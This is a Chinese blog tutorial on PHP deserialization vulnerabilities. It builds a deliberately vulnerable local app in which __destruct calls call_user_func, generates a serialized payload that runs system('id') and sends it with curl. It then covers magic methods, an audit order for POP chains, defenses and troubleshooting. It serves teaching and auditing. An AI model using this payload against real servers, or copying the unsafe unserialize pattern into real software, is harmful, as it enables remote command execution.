---
title: "PHP 反序列化漏洞"
slug: "php-deserialization"
date: 2026-08-29T15:12:25+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "通过控制反序列化数据触发 __destruct，最终执行系统命令。"
summary: "通过控制反序列化数据触发 __destruct，最终执行系统命令。"
tags: ["PHP", "反序列化", "RCE"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 6
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/11.PHP反序列化漏洞.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/php-deserialization/workflow.svg" alt="可控字符串进入 unserialize，属性值在魔术方法中转化为危险调用。" loading="lazy">
  <figcaption>图 1 · PHP 反序列化魔术方法链。可控字符串进入 unserialize，属性值在魔术方法中转化为危险调用。</figcaption>
</figure>

## 1. 本地最小环境

创建 `/tmp/php-deser/index.php`：

```php
<?php
class Runner {
    public string $callable;
    public string $arg;

    public function __destruct() {
        call_user_func($this->callable, $this->arg);
    }
}

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
```

启动：

```bash
cd /tmp/php-deser
php -S 127.0.0.1:8080
```

## 2. 生成 payload

创建 `build.php`：

```php
<?php
class Runner {
    public string $callable = 'system';
    public string $arg = 'id';
}

echo urlencode(serialize(new Runner()));
```

执行：

```bash
PAYLOAD="$(php /tmp/php-deser/build.php)"
curl -sS --get --data-urlencode "data=$PAYLOAD" \
  'http://127.0.0.1:8080/'
```

预期出现 `uid=`。

## 3. 常见魔术方法

| 方法 | 触发时机 | 审计重点 |
| --- | --- | --- |
| `__destruct` | 对象销毁 | 动态调用、文件写入 |
| `__wakeup` | 反序列化恢复后 | 属性校验、文件/网络操作 |
| `__toString` | 对象转字符串 | 拼接、命令、文件路径 |
| `__invoke` | 对象当函数调用 | callable/sink |
| `__call` | 调用不存在方法 | 方法名可控 |
| `__get` | 读取不存在属性 | 链式属性跳转 |

## 4. 审计 POP 链的顺序

1. 找 `unserialize` 入口；
2. 找可自动触发的 magic method；
3. 找 magic method 中可控的 sink；
4. 构造对象属性；
5. 本地生成并发送序列化数据；
6. 如果失败，检查类自动加载、属性可见性和 PHP 版本。

## 5. 防护

```php
$data = unserialize($input, ['allowed_classes' => false]);
```

优先使用 JSON，不要对不可信输入使用 `unserialize`。如果必须使用，设置允许类列表并审计 magic method。

## 6. 排错

- 反序列化返回 `false`：序列化格式损坏或类不存在；
- 对象属性为空：属性名或可见性不一致；
- 命令无回显：`system` 被 `disable_functions` 禁用；
- `__wakeup` 不触发：检查 `unserialize_callback_func` 或类自动加载。
